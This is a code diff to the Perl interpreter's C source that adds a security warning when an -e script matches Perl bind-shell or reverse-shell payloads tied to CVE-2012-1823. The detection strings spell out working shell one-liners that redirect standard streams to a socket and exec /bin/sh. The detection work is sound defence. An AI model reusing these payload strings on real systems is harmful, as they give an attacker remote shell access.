@@ -2030,6 +2030,28 @@ S_parse_body(pTHX_ char **env, XSINIT_t xsinit)
                 Perl_warn_security(aTHX_ "metasploit reverse/bind shell payload");
                 PL_dowarn = oldwarn;
             }
+            else if (UNLIKELY(
+                  /* CVE-2012-1823 payload from phpcgi */
+                  memEQc(SvPVX_const(PL_e_script), "use Socket;")
+                  && SvCUR(PL_e_script) < 250
+                  && (instr(SvPVX_const(PL_e_script)+8,
+                     /* Perl Bind Shell Generator */
+                     ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                     "bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);"
+                     "for(; $p= accept(C, S); close C) {open(STDIN,\">&C\");"
+                     "open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}")
+                      || instr(SvPVX_const(PL_e_script)+8,
+                      /* Perl Reverse Shell Generator */
+                      ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                      "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
+                      "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}"))))
+            {
+                U8 oldwarn = PL_dowarn;
+                PL_dowarn |= G_WARN_ON;
+                set_caret_X();
+                Perl_warn_security(aTHX_ "CVE-2012-1823 reverse/bind shell payload");
+                PL_dowarn = oldwarn;
+            }
 	    break;
 
 	case 'f':
